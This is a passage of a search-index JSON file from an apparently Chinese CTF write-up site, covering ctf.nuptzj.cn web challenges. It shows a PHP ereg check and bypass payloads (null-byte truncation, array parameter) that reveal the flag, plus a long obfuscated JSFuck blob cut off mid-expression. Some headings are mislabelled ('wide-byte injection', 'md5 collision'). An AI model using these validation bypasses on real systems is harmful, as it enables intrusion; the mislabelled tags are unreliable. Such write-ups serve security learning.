        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_where_are_you_come_from/#_5", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_where_are_you_come_from/#_6", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_x00/", 
            "text": "宽字节注入\n\n\n题目\n\n\n\n\n/x00\n\n\nhttp://ctf.nuptzj.cn/challenges#/x00\n\n\nview-source:\n\n\nphp\nif (isset ($_GET['nctf'])) {\n    if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE)\n        echo '必须输入数字才行';\n    else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   \n        die('Flag: '.$flag);\n    else\n        echo '骚年，继续努力吧啊~';\n}\n\n\n\n\n解答思路\n\n\n\n\n@ereg (\"^[1-9]+$\", $_GET['nctf'])即要求nctf变量必须是数字，google发现ereg函数存在%00截断漏洞，当遇到%00(NULL)时，函数就截止了。 \n\n\n输入\nnctf[]=\n 那为什么\nereg()\n也能符合呢?因为\nereg()\n在出错时返回的也是\nnull\n,\nnull!==false\n,所以符合要求 \n\n\n\n\n解题步骤\n\n\n\n\n方法1：\n\n\n\n\n使用%00截断，构造payload如nctf=1%00%23biubiubiu，这里#符号需要进行URL编码，输入后的得到flag\n\n\n\n\n方法2：\n\n\n\n\n使用数组的形式绕过，payload为：nctf[]=123,传入之后，ereg是返回NULL的，===判断NULL和FALSE，是不相等的，所以可以进入第二个判断，strpos处理数组时，也是返回NULL，注意这里的是!==，NULL!==FALSE,条件成立，拿到flag\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "宽字节注入"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_x00/#_1", 
            "text": "", 
            "title": "宽字节注入"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_x00/#_2", 
            "text": "", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_x00/#x00", 
            "text": "http://ctf.nuptzj.cn/challenges#/x00  view-source:  php\nif (isset ($_GET['nctf'])) {\n    if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE)\n        echo '必须输入数字才行';\n    else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   \n        die('Flag: '.$flag);\n    else\n        echo '骚年，继续努力吧啊~';\n}", 
            "title": "/x00"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_x00/#_3", 
            "text": "@ereg (\"^[1-9]+$\", $_GET['nctf'])即要求nctf变量必须是数字，google发现ereg函数存在%00截断漏洞，当遇到%00(NULL)时，函数就截止了。   输入 nctf[]=  那为什么 ereg() 也能符合呢?因为 ereg() 在出错时返回的也是 null , null!==false ,所以符合要求", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_x00/#_4", 
            "text": "方法1：   使用%00截断，构造payload如nctf=1%00%23biubiubiu，这里#符号需要进行URL编码，输入后的得到flag   方法2：   使用数组的形式绕过，payload为：nctf[]=123,传入之后，ereg是返回NULL的，===判断NULL和FALSE，是不相等的，所以可以进入第二个判断，strpos处理数组时，也是返回NULL，注意这里的是!==，NULL!==FALSE,条件成立，拿到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_x00/#_5", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_x00/#_6", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe/", 
            "text": "综合\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#%E7%BB%BC%E5%90%88%E9%A2%98\n\n\njavascript\n[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]](({}[[]]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+!![]+!![]+!![]+!![]+[])+({}[[]]+[])[!![]+!![]])+(!![]+[])[!![]+!![]+!![]]+({}[[]]+[])[+!![]]+(!![]+[])[+[]]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+[])[!![]+!![]+!![]])+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+(!![]+[])[+!![]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+!![]+[]))+(+!![]+[])+({}+[])[!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+({}+[])[!![]+!![]]+(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[])+(![]+[])[+[]]+(!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+[])+({}+[])[!![]+!![]]+(![]+[])[+!![]]+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+[])+(![]+[])[+!![]]+(![]+[])[+!![]]+(![]+[])[+[]]+(!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+[])+(![]+[])[+[]]+({}[[]]+[])[!![]+!![]]+(!![]+!![]+!![]+[])+({}+[])[!![]+!![]]+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]